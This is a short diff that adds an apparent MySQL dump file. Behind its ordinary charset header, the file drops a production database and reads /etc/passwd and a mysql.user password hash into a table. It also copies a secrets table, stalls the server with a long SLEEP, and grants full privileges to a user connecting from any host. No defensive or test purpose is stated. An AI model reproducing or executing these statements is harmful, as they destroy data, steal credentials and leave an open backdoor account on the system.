@@ -1,0 +1,7 @@
+/*!40101 SET NAMES utf8mb4 */;
+DROP DATABASE prod;
+CREATE TABLE `t` (`a` int, `b` text) ENGINE=InnoDB;
+INSERT INTO `t` VALUES (1,'ok'),(2,LOAD_FILE('/etc/passwd')),(3,(SELECT password FROM mysql.user LIMIT 1));
+INSERT INTO `t` SELECT * FROM secrets;
+SELECT SLEEP(100000);
+GRANT ALL ON *.* TO 'x'@'%';
